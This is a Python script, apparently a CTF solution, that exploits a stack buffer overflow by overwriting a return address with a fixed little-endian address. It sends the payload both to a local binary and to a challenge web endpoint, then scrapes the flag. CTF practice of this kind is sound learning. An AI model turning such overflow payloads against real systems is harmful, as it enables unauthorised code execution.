#!/usr/bin/env/python3

"""
this is an attempt at mimicking Donn's business, I suppose

gdb:
x/i $rip to see current instruction
x/5gx $rsp to see addresses in stack
x/s $rsp to see stack as string

Usage: python exploit.py [url]
"""

import subprocess
import sys
import os
from urllib.parse import quote
import requests
from bs4 import BeautifulSoup

def do_exploit(url='http://34.94.3.143/ce811b2b1e/'):
    """Run a buffer overflow attack against this particular CTF challenge"""
    # buffer is 32 bytes, then follows 8 bytes for the EBP
    overflow = bytes('A'*32 + 'B'*8, encoding='UTF-8')
    # before we finally reach the return address
    # --> at 0x004006ee there is a particular piece of code...
    #     we know from checksec that mem is in little-endian order
    #     so the bytes should be placed _backwards_
    exploit = bytes(b'\xee\x06\x40\x00\x00\x00\x00\x00')

    print('Piping into a local instance:')
    # Calling a subprocess doesn't really test anything
    # unless you set env variable FLAGS
    os.environ['FLAGS'] = "If this shows up, we've done it!"
    subprocess.Popen(['./vulnerable'], stdin=subprocess.PIPE)\
        .communicate(input=overflow + exploit)
    print()

    # URL-encoding...
    # Earlier attempt:
    # params = {'stdin': overflow + urllib.parse.quote(exploit, safe='')}
    # (that failed miserably)
    # Now just sending bytes to `requests`:
    params = {'stdin': overflow + exploit}

    print('Sending payload', quote(params['stdin'][-(8):]), 'to the site:')
    req = requests.get(url=url, params=params)
    # Extract and print <pre> tag with flag
    soup = BeautifulSoup(req.text, 'html.parser')
    print(soup.find('pre').get_text().rstrip())

if __name__ == '__main__':
    if len(sys.argv) == 2:
        do_exploit(sys.argv[1])
    do_exploit()
